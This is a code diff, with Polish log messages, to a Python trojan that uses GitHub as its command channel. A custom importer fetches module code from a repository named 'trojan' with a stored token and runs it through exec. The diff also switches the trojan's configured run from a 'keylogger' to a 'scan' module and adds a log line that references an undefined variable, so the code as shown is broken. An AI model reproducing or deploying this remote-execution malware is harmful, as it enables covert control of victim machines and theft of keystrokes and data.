@@ -38,7 +38,7 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_module(self, name, path=None):
-        print("[*] Próba pobrania %s" % name)
+        print(f"[*] Próba pobrania {name}")
         self.import_repo = github_connect('trojan', 'token_trojan.txt')
 
         new_library = get_file_contents('modules', f'{name}.py', self.import_repo)
@@ -53,7 +53,6 @@ class GitImporter:
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
-
 
 class LocalImporter:
     def __init__(self, modules_path):
@@ -74,7 +73,6 @@ class LocalImporter:
         return new_module
 
 
-
 class Trojan:
     def __init__(self, id):
         self.id = id
@@ -93,6 +91,7 @@ class Trojan:
         return config
 
     def module_runner(self, module):
+        print(f"[*] Uruchamianie modułu {name}")
         result = sys.modules[module].run()
         self.store_module_result(result)
 
@@ -120,6 +119,5 @@ if __name__ == '__main__':
     import_or_install_github3()
 
     sys.meta_path.append(GitImporter())
-    # sys.meta_path.append(LocalImporter('modules'))
-    trojan = Trojan('keylogger')
+    trojan = Trojan('scan')
     trojan.run()
